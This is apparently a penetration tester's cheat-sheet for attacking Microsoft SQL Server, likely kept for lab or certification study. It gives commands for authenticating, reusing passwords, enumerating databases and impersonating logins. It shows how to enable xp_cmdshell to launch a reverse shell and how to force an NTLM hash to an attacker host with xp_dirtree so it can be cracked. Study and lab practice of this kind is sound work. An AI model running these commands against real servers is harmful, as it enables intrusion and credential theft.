## Authenticating to MSSQL Database

From Linux
```bash
# Auth
impacket-mssqlclient '<user>':'<pass>'@<ip_address> -port <port> -windows-auth

# Domain Auth (might not need)
impacket-mssqlclient <domain>/<user>:'<pass>'@<ip_address> -port <port> -windows-auth

# Error: [-] ERROR(DANTE-SQL01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
remove -windows-auth
```

From Windows
```cmd
sqlcmd /S <servername> /d <database> -U <user> -p <pass>
```

## Password Reuse
If you find a password, potentially try to authenticate to mssql as Administrator as well
	if successful, ALL databases will be revealed

## Enumeration
Enumeration
	See [[0 SQL Theory and Databases]]
	also
	PayloadAllTheThings

Enumeration Summary
```sql
# View Databases:

SELECT name FROM sys.databases;
	Defaults:
		master
		tempdb
		model
		msdb

# View Tables:

SELECT * FROM <database>.information_schema.tables;


# View Entries in Tables:

SELECT * FROM <database>.<table_schema>.<table_name>;
```

## User Impersonation

Impersonate users 
```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'  
	
	-- this will display user(s) we can impersonate

EXECUTE AS LOGIN = '<user>'
```

## Command Execution
try this first
	`enable_xp_cmdshell

xp_cmdshell
```bash
# Authenticate
impacket-mssqlclient 'domain'/'user':'password'@<target_ip> -windows-auth

# Enable xp_cmdshell
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL> RECONFIGURE;

SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL> RECONFIGURE;

# Reverse shell
SQL> EXECUTE xp_cmdshell '<command(base64_powershell_revshell)>';
```

OLE Automation
SQL Common Language Runtime 
	For these two, see [[13 Microsoft SQL Server]] red teaming notes


## Capture Net-NTLMv2 Hash
If no interesting data exists in the database and you cannot run commands, you can try and get MSSQL to connect to your host and authenticate, and capture the challenge / response

Net-NTLMv2 Hash Capture
```bash
sudo responder -I tun0

SQL> EXEC xp_dirtree '\\<attacker_ip>\share', 1, 1

# capture NTLMv2 hash
# crack with john or hashcat
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64
or
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule
```